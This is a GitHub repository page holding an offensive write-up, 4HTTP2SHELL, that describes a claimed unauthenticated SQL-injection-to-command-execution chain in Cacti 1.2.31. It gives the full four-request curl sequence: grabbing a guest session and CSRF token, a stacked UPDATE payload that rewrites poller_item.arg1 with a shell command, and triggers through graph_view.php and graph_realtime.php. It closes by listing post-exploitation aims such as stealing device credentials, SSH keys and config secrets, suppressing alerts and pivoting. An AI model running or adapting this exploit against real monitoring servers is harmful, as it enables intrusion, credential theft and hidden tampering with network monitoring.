---
title: Sad-Girls-0day-Club/4http2shell at main · ekomsSavior/Sad-Girls-0day-Club
url: https://github.com/ekomsSavior/Sad-Girls-0day-Club/tree/main/4http2shell
hostname: github.com
description: farming zero days from my depression bubble. Coping till the next shell. - ekomsSavior/Sad-Girls-0day-Club
sitename: GitHub
date: "2026-11-25"
categories: ['repository:1471229612']
fingerprint: "5d31059891ab299"
language: en
image: https://opengraph.githubassets.com/3c980ef5f4df0fb684a831390a99a86a18611b67bc75a391648d0be754c1213f/ekomsSavior/Sad-Girls-0day-Club
pagetype: object
filedate: "2026-11-28"
---
**ek0ms savi0r** · Church of Malware · Nov. 26, 2026

Cacti is one of those products that quietly owns the truth in a network. It sits in the monitoring layer, but the credentials it holds are not monitoring credentials. It talks to routers, switches, firewalls, Linux hosts, Windows boxes, PDUs, UPSes, and databases. It knows the SNMP strings. It knows the device logins. It knows where the backups live. In a lot of shops, the Cacti server is more valuable than the domain controller because it is trusted everywhere and audited by nobody.

That is why I spend time in it.

I found a path from a fresh, unauthenticated HTTP session to command execution as the Cacti server user in four requests. No login. No valid API key. No phishing. Just four HTTP requests against the default guest surface.

This is 4HTTP2SHELL.

## As we read on let us remember companies like Microslop, Amazon, alibaba, Huawei and many others use Cacti:

Cacti lets a guest write an arbitrary string into the per-user
`preview_graphs_per_page` setting through
`auth_profile.php?action=update_data`. That value is later read as the default
for the `graphs` filter in `graph_view.php` and concatenated into the SQL
`LIMIT` clause in `get_allowed_graphs()`. The request-side filter does not
apply to the database-side default. PDO accepts stacked statements, so the
guest can execute arbitrary `UPDATE` statements.

I used that write to change `poller_item.arg1` to a shell command. Then I asked
the guest-reachable `graph_realtime.php?action=init` endpoint to run the
realtime poller. The poller reads `poller_item.arg1` and passes it to
`popen()`. Game over.

No memory corruption. No deserialization gadget. No brute force. Just a trust boundary that was never a boundary.

The target is current version Cacti Core 1.2.31 on an isolated lab host. The guest account was
enabled. The web tier and poller ran as root in this lab; on a normal
deployment the same chain runs as the Cacti web user, usually `www-data` or
`apache`. The privilege of the shell depends on the deployment. The ability to
get a shell does not.

Cacti hands a fresh visitor a guest session from `auth_profile.php`. No
credentials are sent.

```
C=http://127.0.0.1:8096/cacti
J=/tmp/cacti.jar
rm -f "$J"
curl -s -c "$J" -b "$J" \
  "$C/auth_profile.php?tab=general&header=false" \
  -o /tmp/cacti_guest.html
```
The response contains a valid session and a CSRF token:

```text
HTTP 200
Set-Cookie: Cacti=...
<title>User Profile (Edit)</title>
csrfMagicToken='sid:...,...'
```
This is the first place where a lot of people will stop and say "but it is only the guest account." The guest account is not the problem. What the guest account can write is the problem.

The profile update endpoint accepts a setting name and a value:

```
TOK=$(grep -o "csrfMagicToken='[^']*'" /tmp/cacti_guest.html \
  | head -1 | cut -d"'" -f2)
CMD='id > /srv/cacti-lpe/pwn.txt; hostname >> /srv/cacti-lpe/pwn.txt'
HEX=$(CMD="$CMD" python3 -c 'import os; print(os.environ["CMD"].encode().hex())')
PAY="1;UPDATE poller_item SET host_id=1,action=1,arg1=0x$HEX \
WHERE local_data_id=1;-- "
curl -s -b "$J" -c "$J" \
  --data-urlencode "__csrf_magic=$TOK" \
  --data-urlencode "name=preview_graphs_per_page" \
  --data-urlencode "value=$PAY" \
  "$C/auth_profile.php?tab=general&action=update_data&header=false"
```
The endpoint stores the value in `settings_user`. The write itself is a
prepared statement. That is the detail that makes this bug fun: the storage
layer is safe, but the consumer is not. The value is a string that is later
treated as part of a SQL statement.

`preview_graphs_per_page` is supposed to be a page size. It is not validated
as an integer. The guest controls it.

`graph_view.php?action=preview` reads the stored default and builds the limit:

```
curl -s -b "$J" -c "$J" \
  "$C/graph_view.php?action=preview&page=1&clear=1"
```
The relevant code path is:

```text
graph_view.php:657
$limit = (get_request_var('graphs')*(get_request_var('page')-1))
       . ',' . get_request_var('graphs');
lib/auth.php:1574-1578
$sql_limit = "LIMIT $sql_limit";
```
The `graphs` value comes from the stored guest setting, not from the request.
The request-side `FILTER_VALIDATE_INT` never sees the database default. The
result is SQL that looks roughly like this:

`... LIMIT 0,1;UPDATE poller_item SET ...;--` PDO sends the whole string as a multi-statement query. The `UPDATE` executes.
The HTTP response is still a normal preview page. There is no obvious error.
The application logs a PHP warning about a non-numeric value, but the request
succeeds.

The realtime poller is reachable from the same guest session:

```
curl -s -b "$J" -c "$J" \
  "$C/graph_realtime.php?action=init&local_graph_id=1&ds_step=10&size=90"
```
That calls `poller_realtime.php`, which calls `cmd_realtime.php`, which reaches:

```text
cmd_realtime.php:221
$output = trim(exec_poll($item['arg1']));
lib/poller.php:32-56
$fp = popen($command, 'r');
```
`poller_item.arg1` is the command I wrote in request 2. `popen()` runs it
through the shell. The HTTP response is a JSON object with a graph image; the
command executes in the same request.

The marker:

```text
-rw-r--r-- 1 root root 39 ... /srv/cacti-lpe/pwn.txt
uid=0(root) gid=0(root) groups=0(root)
```
The same file was served back over HTTP from the Cacti webroot. That is not a side effect; it is the point. The web tier can write where the web tier reads.

1. **The guest can write a numeric setting as an arbitrary string.** The
profile endpoint checks that the setting name exists, but not that the value
is a valid integer.
2. **The stored default bypasses request validation.** Request parameters are
filtered. The database default is not. The application trusts its own
storage as if the value had already been validated.
3. **The limit is concatenated into SQL.** `LIMIT` is treated as a string
fragment. The database driver accepts stacked statements.
4. **The poller executes a database-stored command string.** `poller_item.arg1` is passed to `popen()` without an allowlist. Anything that can write that
row can run a shell command.

The fourth step is the one that turns a SQL injection into a shell. The third step is the one that makes Cacti’s database tell the truth. The first two are the ones that let an anonymous visitor get there.

I have seen SQL injection findings that are interesting but useless because the database user cannot write anything important, or because the application never uses the data in a dangerous place. This is not one of those. The database row the guest can write is the row the poller executes.

The interesting part is not the `id` command. The interesting part is what
lives on a Cacti server.

A Cacti host is usually a jump box by accident. It has:

- SNMP community strings for network devices;
- device credentials in the database;
- SSH keys or service accounts used by pollers;
- database credentials in `include/config.php`;
- mail relay credentials;
- access to internal management networks;
- cron jobs and backup scripts;
- the trust of every device that accepts monitoring traffic.

Once I have a shell on that host, I do not need to exploit the network devices. I can read the credentials Cacti already uses and log in as the monitoring account. I can change the data the operations team sees. I can suppress alerts by editing the poller or the database. I can use the host as a pivot into segments that only the monitoring server can reach.

That is why this is bad. It is not just "a web app got a shell." It is "the thing that watches the network is now on the attacker's side."

The four-request path is also quiet. A guest session is normal. A profile update is normal. A preview request is normal. A realtime graph request is normal. There is no upload, no exploit payload in a URL that looks like a shell, and no authentication event. The loudest artifact is a PHP warning about a non-numeric value, and most teams do not alert on that.

Four requests. No credentials. Root on the monitoring server.

That is 4HTTP2SHELL.

— ek0ms savi0r Church of Malware
